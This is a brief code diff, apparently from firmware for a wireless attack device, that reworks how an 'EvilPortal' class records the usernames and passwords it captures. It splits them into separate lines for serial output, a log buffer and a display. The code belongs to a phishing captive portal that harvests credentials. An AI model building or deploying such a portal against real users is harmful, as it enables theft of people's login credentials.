@@ -331,14 +331,15 @@ void EvilPortal::main(uint8_t scan_mode) {
     if (this->name_received && this->password_received) {
       this->name_received = false;
       this->password_received = false;
-      String logValue1 =
-          "u: " + this->user_name;
-      String logValue2 = "p: " + this->password;
-      String full_string = logValue1 + " " + logValue2 + "\n";
-      Serial.print(full_string);
-      buffer_obj.append(full_string);
+      String logValue1 = "u: " + this->user_name;
+      String logValue2 = "p: " + this->password + "\n";
+      Serial.print(logValue1);
+      Serial.print(logValue2);
+      buffer_obj.append(logValue1);
+      buffer_obj.append(logValue2);
       #ifdef HAS_SCREEN
-        this->sendToDisplay(full_string);
+        this->sendToDisplay(logValue1);
+        this->sendToDisplay(logValue2);
       #endif
     }
   }
